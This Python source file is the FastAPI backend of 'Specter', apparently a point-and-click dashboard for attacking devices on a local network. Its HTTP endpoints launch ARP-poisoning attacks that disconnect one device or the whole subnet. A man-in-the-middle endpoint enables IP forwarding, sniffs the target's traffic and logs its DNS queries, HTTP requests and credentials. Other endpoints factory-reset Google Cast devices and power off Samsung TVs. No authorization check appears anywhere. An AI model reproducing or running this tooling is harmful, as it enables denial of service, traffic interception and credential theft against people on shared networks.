"""Specter Web Dashboard — FastAPI backend.

Provides REST API and WebSocket endpoints for the web UI.
All attack capabilities are exposed via HTTP endpoints.
"""

import asyncio
import json
import time
import threading
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Any

from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, FileResponse
from pydantic import BaseModel

# Global state
_state = {
    "devices": [],
    "active_attacks": {},
    "logs": [],
    "mitm_sessions": {},
}

# WebSocket connections for real-time updates
_ws_connections: list[WebSocket] = []


@asynccontextmanager
async def lifespan(app: FastAPI):
    yield
    # Cleanup active attacks on shutdown
    for attack_id, attack in _state["active_attacks"].items():
        if hasattr(attack.get("instance"), "stop"):
            attack["instance"].stop()


app = FastAPI(title="Specter", version="0.1.0", lifespan=lifespan)

static_dir = Path(__file__).parent / "static"
templates_dir = Path(__file__).parent / "templates"


# --- Models ---

class ScanRequest(BaseModel):
    subnet: str | None = None
    timeout: float = 5.0
    ports: bool = False


class KillRequest(BaseModel):
    target_ip: str
    duration: int = 0


class NukeRequest(BaseModel):
    mode: str = "all"  # "all" or "gateway"
    subnet: str | None = None


class MITMRequest(BaseModel):
    target_ip: str


class CastRequest(BaseModel):
    target_ip: str
    action: str
    token: str = ""


class TVRequest(BaseModel):
    target_ip: str
    action: str


# --- Helpers ---

async def broadcast(event: str, data: Any):
    """Send event to all connected WebSocket clients."""
    msg = json.dumps({"event": event, "data": data})
    disconnected = []
    for ws in _ws_connections:
        try:
            await ws.send_text(msg)
        except Exception:
            disconnected.append(ws)
    for ws in disconnected:
        _ws_connections.remove(ws)


def add_log(level: str, message: str):
    """Add a log entry and broadcast it."""
    entry = {"time": time.strftime("%H:%M:%S"), "level": level, "message": message}
    _state["logs"].append(entry)
    # Keep last 500 logs
    if len(_state["logs"]) > 500:
        _state["logs"] = _state["logs"][-500:]
    # Schedule broadcast
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            loop.create_task(broadcast("log", entry))
    except RuntimeError:
        pass


# --- Routes ---

@app.get("/", response_class=HTMLResponse)
async def index():
    """Serve the main dashboard."""
    html_path = templates_dir / "index.html"
    return HTMLResponse(html_path.read_text(encoding="utf-8"))


@app.get("/api/health")
async def health():
    return {"status": "ok", "version": "0.1.0"}


@app.get("/api/devices")
async def get_devices():
    """Return all discovered devices."""
    return {"devices": _state["devices"]}


@app.post("/api/scan")
async def trigger_scan(req: ScanRequest):
    """Run a network scan and return discovered devices."""
    from specter.scanner.arp import arp_scan
    from specter.scanner.mdns import MDNSScanner
    from specter.scanner.fingerprint import fingerprint_device, lookup_oui

    subnet = req.subnet
    if not subnet:
        from scapy.all import conf
        ip = conf.route.route("0.0.0.0")[1]
        subnet = f"{ip}/24"

    add_log("info", f"Scanning {subnet}...")

    # ARP scan
    hosts = arp_scan(subnet, timeout=req.timeout)

    # mDNS
    mdns = MDNSScanner()
    services = mdns.scan(duration=req.timeout)
    service_map: dict[str, list[str]] = {}
    for svc in services:
        service_map.setdefault(svc.host, []).append(svc.service_type)

    # Port scan if requested
    port_map: dict[str, list[dict]] = {}
    if req.ports:
        from specter.scanner.ports import port_scan
        for host in hosts:
            result = port_scan(host.ip, timeout=1.0)
            if result.open_ports:
                port_map[host.ip] = [
                    {"port": p.port, "service": p.service, "banner": p.banner[:100], "unauth": p.unauthenticated}
                    for p in result.open_ports
                ]

    # Resolve device names
    from specter.scanner.names import resolve_names
    host_dicts = [{"ip": h.ip, "mac": h.mac} for h in hosts]
    name_map = resolve_names(host_dicts, service_map, services)

    # Build device list
    devices = []
    for host in hosts:
        svc_list = service_map.get(host.ip, [])
        profile = fingerprint_device(host.ip, host.mac, svc_list)
        devices.append({
            "ip": host.ip,
            "mac": host.mac,
            "name": name_map.get(host.ip, ""),
            "vendor": profile.vendor,
            "device_type": profile.device_type,
            "services": [s.replace("._tcp.local.", "").replace("._udp.local.", "") for s in svc_list],
            "open_ports": port_map.get(host.ip, []),
        })

    _state["devices"] = devices
    add_log("success", f"Found {len(devices)} devices")
    await broadcast("devices", devices)
    return {"devices": devices, "subnet": subnet}


@app.post("/api/portscan")
async def trigger_portscan(target_ip: str):
    """Port scan a specific device."""
    from specter.scanner.ports import port_scan

    add_log("info", f"Port scanning {target_ip}...")
    result = port_scan(target_ip)
    ports = [
        {"port": p.port, "service": p.service, "banner": p.banner[:100], "unauth": p.unauthenticated}
        for p in result.open_ports
    ]
    add_log("success", f"Found {len(ports)} open ports on {target_ip}")

    # Update device in state
    for dev in _state["devices"]:
        if dev["ip"] == target_ip:
            dev["open_ports"] = ports
            break

    await broadcast("devices", _state["devices"])
    return {"ip": target_ip, "ports": ports}


@app.post("/api/kill")
async def kill_device(req: KillRequest):
    """Kill a single device's network connectivity."""
    from specter.killswitch.arp_poison import ARPPoisoner, get_gateway_ip

    gateway = get_gateway_ip()
    attack_id = f"kill_{req.target_ip}"

    if attack_id in _state["active_attacks"]:
        return {"status": "already_running", "attack_id": attack_id}

    poisoner = ARPPoisoner(target_ip=req.target_ip, gateway_ip=gateway)
    poisoner.start()

    _state["active_attacks"][attack_id] = {
        "type": "kill",
        "target": req.target_ip,
        "started": time.time(),
        "instance": poisoner,
    }

    add_log("attack", f"KILL active on {req.target_ip}")
    await broadcast("attack_start", {"id": attack_id, "type": "kill", "target": req.target_ip})
    return {"status": "started", "attack_id": attack_id}


@app.post("/api/nuke")
async def nuke_network(req: NukeRequest):
    """Kill all network connectivity."""
    from specter.killswitch.arp_poison import NetworkKiller, get_gateway_ip
    from scapy.all import conf

    subnet = req.subnet
    if not subnet:
        ip = conf.route.route("0.0.0.0")[1]
        subnet = f"{ip}/24"

    gateway = get_gateway_ip()
    attack_id = "nuke"

    if attack_id in _state["active_attacks"]:
        return {"status": "already_running"}

    killer = NetworkKiller(subnet=subnet, gateway_ip=gateway)

    if req.mode == "gateway":
        count = killer.kill_gateway()
        add_log("attack", f"NUKE (gateway mode) — {count} hosts affected")
    else:
        count = killer.kill_all()
        add_log("attack", f"NUKE (all) — {count} devices disconnected")

    _state["active_attacks"][attack_id] = {
        "type": "nuke",
        "mode": req.mode,
        "started": time.time(),
        "instance": killer,
    }

    await broadcast("attack_start", {"id": attack_id, "type": "nuke", "mode": req.mode, "count": count})
    return {"status": "started", "attack_id": attack_id, "count": count}


@app.post("/api/mitm")
async def start_mitm(req: MITMRequest):
    """Start MITM interception on a target."""
    import platform
    import subprocess
    from specter.killswitch.arp_poison import MITMPoisoner
    from specter.killswitch.sniffer import TrafficSniffer, MITMSession
    from scapy.all import conf

    gateway = conf.route.route("0.0.0.0")[2]
    attack_id = f"mitm_{req.target_ip}"

    if attack_id in _state["active_attacks"]:
        return {"status": "already_running", "attack_id": attack_id}

    # Enable IP forwarding
    if platform.system() == "Windows":
        subprocess.run(
            ["netsh", "interface", "ipv4", "set", "interface", "interface=Wi-Fi", "forwarding=enabled"],
            capture_output=True,
        )

    poisoner = MITMPoisoner(target_ip=req.target_ip, gateway_ip=gateway)
    sniffer = TrafficSniffer(target_ip=req.target_ip)

    poisoner.start()
    sniffer.start()

    _state["active_attacks"][attack_id] = {
        "type": "mitm",
        "target": req.target_ip,
        "started": time.time(),
        "poisoner": poisoner,
        "sniffer": sniffer,
        "instance": poisoner,
    }

    # Start background task to broadcast MITM data
    def mitm_broadcast_loop():
        last_count = 0
        while attack_id in _state["active_attacks"]:
            session = sniffer.session
            if session.packet_count > last_count:
                # Broadcast new events
                for dns in session.dns_queries[last_count:]:
                    add_log("mitm", f"DNS: {dns['query']}")
                for http in session.http_requests[last_count:]:
                    add_log("mitm", f"HTTP: {http['request']}")
                for cred in session.credentials[last_count:]:
                    add_log("cred", f"CREDENTIALS: {cred['snippet'][:80]}")
                last_count = session.packet_count
            time.sleep(1)

    threading.Thread(target=mitm_broadcast_loop, daemon=True).start()

    add_log("attack", f"MITM active on {req.target_ip}")
    await broadcast("attack_start", {"id": attack_id, "type": "mitm", "target": req.target_ip})
    return {"status": "started", "attack_id": attack_id}


@app.post("/api/stop/{attack_id}")
async def stop_attack(attack_id: str):
    """Stop an active attack."""
    import platform
    import subprocess

    if attack_id not in _state["active_attacks"]:
        return {"status": "not_found"}

    attack = _state["active_attacks"].pop(attack_id)

    if attack["type"] == "mitm":
        attack["sniffer"].stop()
        attack["poisoner"].stop()
        if platform.system() == "Windows":
            subprocess.run(
                ["netsh", "interface", "ipv4", "set", "interface", "interface=Wi-Fi", "forwarding=disabled"],
                capture_output=True,
            )
    elif hasattr(attack.get("instance"), "stop"):
        attack["instance"].stop()

    add_log("info", f"Stopped attack: {attack_id}")
    await broadcast("attack_stop", {"id": attack_id})
    return {"status": "stopped", "attack_id": attack_id}


@app.get("/api/attacks")
async def get_attacks():
    """Get all active attacks."""
    attacks = []
    for aid, attack in _state["active_attacks"].items():
        attacks.append({
            "id": aid,
            "type": attack["type"],
            "target": attack.get("target", "network"),
            "started": attack["started"],
            "duration": time.time() - attack["started"],
        })
    return {"attacks": attacks}


@app.get("/api/logs")
async def get_logs():
    """Get recent logs."""
    return {"logs": _state["logs"][-100:]}


@app.post("/api/cast")
async def cast_action(req: CastRequest):
    """Execute a Google Cast action."""
    from specter.modules.google_cast import GoogleCastModule, CastDevice

    device = CastDevice(ip=req.target_ip, local_auth_token=req.token)
    module = GoogleCastModule(device)

    try:
        match req.action:
            case "info":
                data = module.get_device_info()
                add_log("info", f"Got info from {req.target_ip}: {data.get('name', 'Unknown')}")
                return {"status": "ok", "data": data}
            case "reboot":
                result = module.reboot()
                add_log("attack", f"Reboot sent to {req.target_ip}: {'success' if result else 'failed'}")
                return {"status": "ok" if result else "failed"}
            case "reset":
                result = module.factory_reset()
                add_log("attack", f"Factory reset sent to {req.target_ip}")
                return {"status": "ok" if result else "failed"}
            case _:
                return {"status": "error", "message": f"Unknown action: {req.action}"}
    except Exception as e:
        return {"status": "error", "message": str(e)}


@app.post("/api/tv")
async def tv_action(req: TVRequest):
    """Execute a Samsung TV action."""
    from specter.modules.samsung_tv import SamsungTVModule, SamsungTV

    device = SamsungTV(ip=req.target_ip)
    module = SamsungTVModule(device)

    match req.action:
        case "info":
            data = module.get_device_info()
            if data:
                add_log("info", f"Samsung TV info: {data.get('device', {}).get('name', 'Unknown')}")
                return {"status": "ok", "data": data}
            return {"status": "error", "message": "TV not reachable"}
        case "off":
            result = module.power_off()
            add_log("attack", f"Power off sent to TV {req.target_ip}")
            return {"status": "ok" if result else "failed"}
        case "mute":
            module.mute()
            return {"status": "ok"}
        case "volup":
            module.volume_up(5)
            return {"status": "ok"}
        case "voldown":
            module.volume_down(5)
            return {"status": "ok"}
        case _:
            return {"status": "error", "message": f"Unknown action: {req.action}"}


# --- WebSocket ---

@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket):
    await ws.accept()
    _ws_connections.append(ws)
    try:
        while True:
            # Keep connection alive, handle client messages
            data = await ws.receive_text()
            msg = json.loads(data)
            # Handle ping
            if msg.get("type") == "ping":
                await ws.send_text(json.dumps({"event": "pong"}))
    except WebSocketDisconnect:
        _ws_connections.remove(ws)
    except Exception:
        if ws in _ws_connections:
            _ws_connections.remove(ws)
